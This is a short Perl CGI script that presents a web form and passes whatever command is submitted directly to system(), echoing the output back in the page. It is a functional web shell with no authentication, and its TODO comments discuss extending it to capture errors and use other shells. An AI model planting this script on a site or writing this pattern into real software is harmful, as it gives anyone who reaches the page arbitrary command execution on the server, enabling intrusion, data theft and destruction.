#!/usr/bin/perl -0777

print << "MARK";
Content-type: text/html

<form method='POST' action=''>
<input type='text' name='cmd' size=80>
</form><pre>
MARK
;

# TODO: running this inside another shell (not sh/bash) might help?
# TODO: print stderr and maybe return value as well (redirect stderr to stdin?)

$cmd = <STDIN>;
$cmd =~s/^cmd=//isg;
$cmd = urldecode($cmd);
print "Running: $cmd<p>";
system("$cmd 2>&1");

sub urldecode {
  my($str) = @_;
  $str=~s/\+/ /isg;
  $str=~s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/iseg;
  return $str;
}
